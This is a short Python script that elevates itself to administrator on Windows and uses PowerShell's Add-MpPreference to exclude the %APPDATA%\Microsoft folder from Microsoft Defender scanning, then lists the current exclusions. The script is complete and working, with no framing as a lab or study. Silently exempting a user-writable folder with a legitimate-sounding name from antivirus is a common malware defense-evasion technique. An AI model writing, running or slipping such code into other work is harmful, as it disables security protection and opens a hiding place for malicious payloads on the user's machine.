import os
import sys
import ctypes
import subprocess
from elevate import elevate

# Function to check if script is running as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# Main logic for exclusions
def add_exclusion():
    # Path to exclude (replace with your folder path)
    folder_path = os.path.expandvars(r"%APPDATA%\Microsoft")

    # Add exclusion using PowerShell (using check_output to capture output)
    add_exclusion_command = [
        "powershell", "-Command", f"Add-MpPreference -ExclusionPath '{folder_path}'"
    ]
    
    try:
        subprocess.check_output(add_exclusion_command, stderr=subprocess.STDOUT, text=True)
        print(f"Successfully added exclusion for '{folder_path}'.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion. Error: {e.output}")

    # Check if the exclusion was added
    check_command = [
        "powershell", "-Command", "(Get-MpPreference).ExclusionPath"
    ]
    
    try:
        result = subprocess.check_output(check_command, stderr=subprocess.STDOUT, text=True)
        if result.strip():
            print("Current Exclusions:")
            print(result.strip())
        else:
            print("No exclusions found.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to retrieve exclusions. Error: {e.output}")

# Entry point
if __name__ == "__main__":
    if not is_admin():
        # Elevate if not running as admin
        elevate()
        sys.exit(0)  # Exit to prevent duplicate execution
    else:
        # Run the main exclusion logic
        add_exclusion()
